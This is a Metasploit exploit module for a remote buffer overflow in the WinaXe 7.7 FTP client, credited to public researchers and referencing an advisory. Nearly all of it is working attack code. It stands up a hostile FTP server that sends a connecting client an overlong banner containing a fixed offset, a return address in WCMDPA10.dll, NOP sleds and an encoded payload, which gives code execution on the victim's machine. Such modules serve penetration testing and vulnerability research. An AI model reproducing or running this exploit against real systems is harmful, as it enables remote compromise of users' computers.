# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::FtpServer

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WinaXe 7.7 FTP Client Remote Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in the WinaXe 7.7 FTP client.
        This issue is triggered when a client connects to the server and is
        expecting the Server Ready response.
      },
      &#039;Author&#039; =>
        [
          &#039;Chris Higgins&#039;,  # msf Module -- @ch1gg1ns
          &#039;hyp3rlix&#039;        # Original discovery
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;40693&#039;],
          [ &#039;URL&#039;, &#039;http://hyp3rlinx.altervista.org/advisories/WINAXE-FTP-CLIENT-REMOTE-BUFFER-OVERFLOW.txt&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1000,
          &#039;BadChars&#039; => "\x00\x0a\x0d"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows Universal&#039;,
            {
              &#039;Offset&#039; => 2065,
              &#039;Ret&#039; => 0x68017296 # push esp # ret 0x04 WCMDPA10.dll
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Nov 03 2016&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def on_client_unknown_command(c, _cmd, _arg)
    c.put("200 OK\r\n")
  end

  def on_client_connect(c)
      print_status("Client connected...")

      sploit =  rand_text(target[&#039;Offset&#039;])
      sploit << [target.ret].pack(&#039;V&#039;)
      sploit << make_nops(10)
      sploit << payload.encoded
      sploit << make_nops(20)

      c.put("220" + sploit + "\r\n")
      c.close
  end

end

